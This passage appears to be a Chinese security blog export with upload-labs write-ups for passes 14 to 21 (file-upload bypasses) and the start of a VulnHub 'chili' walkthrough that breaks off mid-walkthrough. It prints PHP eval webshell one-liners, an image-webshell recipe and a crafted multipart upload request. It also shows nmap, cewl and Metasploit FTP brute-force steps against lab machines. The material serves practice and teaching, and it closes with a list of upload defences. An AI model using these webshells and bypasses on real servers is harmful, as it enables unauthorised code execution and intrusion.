class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>strrpos(a,b):b在a字符串中最后一次出现的位置</p>
</blockquote>
<h1 id="Pass-14-21-内容逻辑数组绕过"><a href="#Pass-14-21-内容逻辑数组绕过" class="headerlink" title="Pass 14-21(内容逻辑数组绕过)"></a>Pass 14-21(内容逻辑数组绕过)</h1><p>图片马制作：</p>
<p>法1:notepad++，直接打开图片，末尾加代码</p>
<p><code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p>
<p>法2:控制台执行copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg</p>
<p>&#x2F;a二进制打开，&#x2F;b以ASCII码形式打开</p>
<h2 id="Pass-14-图片码-文件包含漏洞"><a href="#Pass-14-图片码-文件包含漏洞" class="headerlink" title="Pass 14(图片码+文件包含漏洞)"></a>Pass 14(图片码+文件包含漏洞)</h2><blockquote>
<p>上传<code>图片马</code>到服务器。</p>
<p>注意：</p>
<p>1.保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码。</p>
<p>2.使用<a href="http://localhost:81/uploadlabs/include.php">文件包含漏洞</a>能运行图片马中的恶意代码。</p>
<p>3.图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！</p>
</blockquote>
<p>文件头检测：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>文件包含漏洞执行后门代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230526224245825.png" alt="image-20230526224245825"></p>
<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass 15"></a>Pass 15</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getimagesize():返回图像的尺寸以及文件类型和 height/width 文本字符串，以在标准 HTML IMG 标签和对应的 HTTP 内容类型中使用。</span><br></pre></td></tr></table></figure>

<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass 16"></a>Pass 16</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>服务器配置说明：</p>
<p>1.在php.ini文件中找到;extension&#x3D;php_exif.dll，去掉前面的分号<br>2.在php.ini文件中找到;extension&#x3D;php_mbstring.dll，去掉前面的分号，并将此行移动到extension&#x3D;php_exif.dll之前，使之首先加载*。</p>
<p>3.找到[exif]段，把下面语句的分号去掉。</p>
<p>;exif.encode_unicode &#x3D; ISO-8859-15<br>        ;exif.decode_unicode_motorola &#x3D; UCS-2BE<br>        ;exif.decode_unicode_intel &#x3D; UCS-2LE<br>        ;exif.encode_jis &#x3D;<br>        ;exif.decode_jis_motorola &#x3D; JIS<br>        ;exif.decode_jis_intel &#x3D; JIS重启php</p>
</blockquote>
<blockquote>
<p>exif_imagetype():<strong>读取一个图像的第一个字节并检查其签名</strong></p>
</blockquote>
<h2 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass 17(二次渲染)"></a>Pass 17(二次渲染)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先上传临时文件，服务器会将该临时文件重命名。</p>
<p>这个体现的地方在于，服务器不会过滤文件，这个文件会先上传到服务器中，服务器通过短暂地判断，对文件进行重命名或删除操作</p>
<p>实践证明：</p>
<p>bp抓包，发送到intruder，</p>
<p>在数据包中添加一行无关信息：</p>
<p><strong>X-forward-For: 8.8.8.8</strong></p>
<p>对最后一个8进行add，从1到11111111的爆破，在爆破的同时，我们打开上传文件的文件夹，刷新，会看到上传的不符合要求的php文件，短暂地存在过，又被删除掉。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230526232154257.png" alt="image-20230526232154257"></p>
<p> 这不代码审计看不出来吧</p>
<blockquote>
<p>二次渲染：后端重写文件内容</p>
<p>basename(path[,suffix]) ，没指定suffix则返回后缀名，有则不返回指定的后缀名<br>strrchr(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br>imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</p>
<p>对于做文件上传之二次渲染建议用<code>GIF</code>图片，相对于简单一点</p>
<p>————————————————<br>版权声明：本文为CSDN博主「晚安這個未知的世界」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p>
</blockquote>
<h2 id="Pass-20-目录命名-黑名单"><a href="#Pass-20-目录命名-黑名单" class="headerlink" title="Pass 20(目录命名+黑名单)"></a>Pass 20(目录命名+黑名单)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目录命名: x.php&#x2F;.</p>
<h2 id="Pass-没好好做，之后再整理一下"><a href="#Pass-没好好做，之后再整理一下" class="headerlink" title="Pass(没好好做，之后再整理一下)"></a>Pass(没好好做，之后再整理一下)</h2><h2 id="Pass-21-数组接收-目录命名-白名单"><a href="#Pass-21-数组接收-目录命名-白名单" class="headerlink" title="Pass 21(数组接收+目录命名+白名单)"></a>Pass 21(数组接收+目录命名+白名单)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>end()输出数组中最后一个元素值</p>
<p>count()返回数组元素中的数目</p>
<p>explode(sep,string)，将字符串以sep分割，打散为数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$str</span> = <span class="string">&quot;Hello world. I love Shanghai!&quot;</span>;</span><br><span class="line">&gt;<span class="title function_ invoke__">print_r</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Array ( [0] &#x3D;&gt; Hello [1] &#x3D;&gt; world. [2] &#x3D;&gt; I [3] &#x3D;&gt; love [4] &#x3D;&gt; Shanghai! )</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryMwDdKjYYVrqj1ZUH</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">upload-20.php</span><br><span class="line">------WebKitFormBoundaryMwDdKjYYVrqj1ZUH</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文件上传<br>漏洞成因： 具备上传文件功能的Web等应用，未对用户选择上传的文件进行校验，使得非法用户可通过上传可执行脚本而获取应用的控制权限。<br>防护与绕过： 通过upload-labs靶场实战，了解更多的防护与绕过手段。</p>
<p>防御<br>不要暴露上传文件的位置<br>禁用上传文件的执行权限<br>黑白名单<br>对上传的文件重命名，不易被猜测<br>对文件内容进行二次渲染<br>对上传的内容进行读取检查<br>————————————————<br>版权声明：本文为CSDN博主「晚安這個未知的世界」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>文件上传防御</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub</title>
    <url>/2023/06/30/vulnhub/</url>
    <content><![CDATA[<h1 id="一、easy"><a href="#一、easy" class="headerlink" title="一、easy"></a>一、easy</h1><h2 id="1-chili-ftp-监听"><a href="#1-chili-ftp-监听" class="headerlink" title="1.chili(ftp+监听)"></a>1.chili(ftp+监听)</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p><code>netdiscover</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620204515392.png"></p>
<p>ip为192.168.1.4</p>
<h3 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h3><p><code>nmap -Pn 192.168.1.4</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620204816839.png"></p>
<p>21端口和80端口</p>
<p>再详细点</p>
<p><code>nmap -p21,80 -Pn -sV -sS -A -n 192.168.1.4</code>                                           </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p21,80 -Pn -sV -sS -A -n 192.168.1.4</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 20:50 CST</span><br><span class="line">Nmap scan report for 192.168.1.4</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Chili</span><br><span class="line">MAC Address: 00:0C:29:FE:75:B5 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.73 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>

<h3 id="3-访问80端口"><a href="#3-访问80端口" class="headerlink" title="3.访问80端口"></a>3.访问80端口</h3><p>一个小辣椒图片。</p>
<p>f12，网页源代码，发现有一些单词提示</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620210231238.png"></p>
<p>cewl工具爬取</p>
<blockquote>
<p>┌──(root㉿kali)-[~]</p>
<p>└─# cewl <a href="http://192.168.1.4/">http://192.168.1.4</a> &gt;user.txt</p>
<p>┌──(root㉿kali)-[~]<br>└─# cat user.txt<br>Chili<br>Are<br>Still<br>Alive</p>
</blockquote>
<p>当然还要将该文件的单词，大写复写，小写复写一遍。</p>
<p>打开msf工具准备ftp弱口令爆破。</p>
<blockquote>
<p>-<strong>msfconsole</strong></p>
<p>-show auxiliary</p>
<p>-search ftp_login</p>
<p>-use 0</p>
<p>-show options</p>
<p>…</p>
</blockquote>
<blockquote>
<p>-set rhosts 192.168.1.4</p>
<p>-set user_file user.txt</p>
<p>-set pass_file password.txt</p>
</blockquote>
<blockquote>
<p>-exploit</p>
</blockquote>
<p>当然，我没爆破出来，字典不行。</p>
<p>看wp得，密码为a1b2c3d4</p>
<h3 id="4-ftp连接"><a href="#4-ftp连接" class="headerlink" title="4.ftp连接"></a>4.ftp连接</h3><blockquote>
<p>└─# ftp 192.168.1.4<br>Connected to 192.168.1.4.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.1.4:root): chili<br>331 Please specify the password.<br>Password:<br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.</p>
</blockquote>
<blockquote>
<p>ftp&gt;pwd</p>
<p>…</p>
<p>经过一系列尝试，访问进网站根目录。</p>
